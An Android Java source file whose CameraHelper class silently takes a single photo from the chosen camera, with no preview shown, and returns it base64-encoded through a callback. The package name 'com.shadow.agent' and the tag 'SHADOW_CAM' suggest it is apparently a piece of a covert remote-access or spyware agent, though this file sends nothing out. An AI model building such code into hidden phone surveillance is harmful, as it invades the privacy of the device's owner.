package com.shadow.agent;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;

import java.nio.ByteBuffer;

public class CameraHelper {

    private static final String TAG = "SHADOW_CAM";
    private final Context context;

    public CameraHelper(Context context) {
        this.context = context;
    }

    public interface Callback {
        void onResult(String base64Jpeg, String error);
    }

    public void capturePhoto(final int facing, final Callback cb) {
        try {
            CameraManager cm = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { cb.onResult(null, "No camera service"); return; }

            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer lens = ch.get(CameraCharacteristics.LENS_FACING);
                if (lens != null && lens == facing) { cameraId = id; break; }
            }
            if (cameraId == null) { cb.onResult(null, "Camera not found"); return; }

            final String finalCameraId = cameraId;
            HandlerThread ht = new HandlerThread("cam-bg");
            ht.start();
            final Handler handler = new Handler(ht.getLooper());

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader r) {
                    Image img = r.acquireLatestImage();
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    r.close();
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    cb.onResult(b64, null);
                    ht.quitSafely();
                }
            }, handler);

            CameraDevice.StateCallback stateCb = new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    try {
                        final CaptureRequest.Builder req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        req.addTarget(reader.getSurface());
                        req.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                        camera.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(req.build(), null, handler);
                                    } catch (Exception e) {
                                        cb.onResult(null, e.getMessage());
                                    }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    cb.onResult(null, "Session failed");
                                }
                            }, handler);
                    } catch (Exception e) {
                        cb.onResult(null, e.getMessage());
                    }
                }
                @Override
                public void onDisconnected(CameraDevice camera) { cb.onResult(null, "Disconnected"); }
                @Override
                public void onError(CameraDevice camera, int error) { cb.onResult(null, "Camera error: " + error); }
            };

            if (androidx.core.content.ContextCompat.checkSelfPermission(context,
                    android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                cb.onResult(null, "Camera permission denied");
                return;
            }
            cm.openCamera(finalCameraId, stateCb, handler);

        } catch (Exception e) {
            Log.e(TAG, "Capture error", e);
            cb.onResult(null, e.getMessage());
        }
    }
}